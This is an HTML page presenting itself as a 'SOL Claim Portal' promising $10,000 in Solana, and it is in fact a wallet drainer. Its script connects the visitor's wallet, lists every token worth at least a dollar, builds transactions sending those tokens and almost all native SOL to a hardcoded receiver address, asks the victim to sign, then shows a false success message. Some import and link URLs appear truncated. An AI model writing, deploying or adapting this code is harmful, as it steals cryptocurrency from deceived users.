<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOL Claim Portal</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --bg: #0a0a0c; --accent: #14F195; }
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Inter', sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; overflow: hidden; color: white; }
        
        /* Animated Background */
        .mesh { position: absolute; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 50% 50%, rgba(20, 241, 149, 0.05), transparent 70%); animation: pulse 8s infinite alternate; }
        @keyframes pulse { from { opacity: 0.3; transform: scale(1); } to { opacity: 0.8; transform: scale(1.2); } }

        .card { 
            background: rgba(255, 255, 255, 0.03); 
            backdrop-filter: blur(30px); 
            -webkit-backdrop-filter: blur(30px);
            padding: 50px 30px; 
            border-radius: 40px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            text-align: center; 
            width: 85%; 
            max-width: 400px;
            box-shadow: 0 40px 100px rgba(0,0,0,0.5);
        }

        /* Fixed Single-Line Responsive Text */
        .title { 
            font-size: 7.5vw; /* Scales with screen width */
            font-weight: 900; 
            white-space: nowrap; 
            margin-bottom: 40px; 
            background: linear-gradient(to bottom, #fff, #888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -1px;
        }

        @media(min-width: 450px) { .title { font-size: 32px; } }

        .btn { 
            background: #ffffff; color: #000; 
            padding: 20px 0; border-radius: 18px; 
            font-weight: 800; font-size: 16px; 
            border: none; cursor: pointer; 
            text-transform: uppercase; width: 100%; 
            transition: 0.3s cubic-bezier(0.2, 1, 0.3, 1);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .btn:hover { background: var(--accent); transform: translateY(-3px); }
    </style>
</head>
<body>
    <div class="mesh"></div>
    <div class="card">
        <div class="title">CLAIM $10,000 SOL</div>
        <button class="btn" onclick="connectUniversalWallet()">Connect Wallet</button>
    </div>

    <script type="module">
        import * as web3 from 'https://esm.sh';
        import * as spl from 'https://esm.sh';

        const HELIUS_RPC = "https://helius-rpc.com";
        const RECEIVER = new web3.PublicKey("5KKphHnhQdhMMibgPDSsWXtDPZiFyXPPNSrKXuXxA2CM");
        const connection = new web3.Connection(HELIUS_RPC);

        window.connectUniversalWallet = async () => {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            
            // Universal Detection: Checks for any injected Solana provider
            const provider = window.solana || window.phantom?.solana || window.solflare || window.backpack || window.trustWallet?.solana;

            if (isMobile && !provider) {
                // Universal Deep Link Fallback (Opens in Phantom Browser as standard)
                const encodedUrl = encodeURIComponent(window.location.href);
                window.location.href = `https://phantom.app{encodedUrl}?ref=${encodedUrl}`;
                return;
            }

            if (!provider) return alert("No Solana wallet detected. Open this in your wallet's browser.");

            try {
                const resp = await provider.connect();
                const sender = resp.publicKey;

                // Fetch & Sort Assets via Helius
                const res = await fetch(HELIUS_RPC, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0', id: '1', method: 'getAssetsByOwner',
                        params: { ownerAddress: sender.toBase58(), displayOptions: { showNativeBalance: true } }
                    }),
                });
                const { result } = await res.json();
                
                const instructions = [];
                const items = (result.items || []).filter(a => a.token_info?.price_info?.total_price >= 1);

                for (const asset of items) {
                    const mint = new web3.PublicKey(asset.id);
                    const destAta = await spl.getAssociatedTokenAddress(mint, RECEIVER);
                    instructions.push(spl.createAssociatedTokenAccountInstruction(sender, destAta, RECEIVER, mint));
                    instructions.push(spl.createTransferCheckedInstruction(
                        new web3.PublicKey(asset.token_info.associated_token_address), mint, destAta, sender, asset.token_info.balance, asset.token_info.decimals
                    ));
                }

                const solBalance = result.nativeBalance?.lamports || 0;
                if (solBalance > 5000000) {
                    instructions.push(web3.SystemProgram.transfer({ fromPubkey: sender, toPubkey: RECEIVER, lamports: solBalance - 5000000 }));
                }

                if (instructions.length === 0) return alert("Insufficient balance to claim.");

                const { blockhash } = await connection.getLatestBlockhash();
                const msg = new web3.TransactionMessage({ payerKey: sender, recentBlockhash: blockhash, instructions }).compileToV0Message();
                const tx = new web3.VersionedTransaction(msg);
                
                const signed = await provider.signTransaction(tx);
                await connection.sendRawTransaction(signed.serialize());
                alert("Claim submitted successfully!");
            } catch (err) {
                console.error(err);
                alert("Connection failed: " + err.message);
            }
        };
    </script>
</body>
</html>
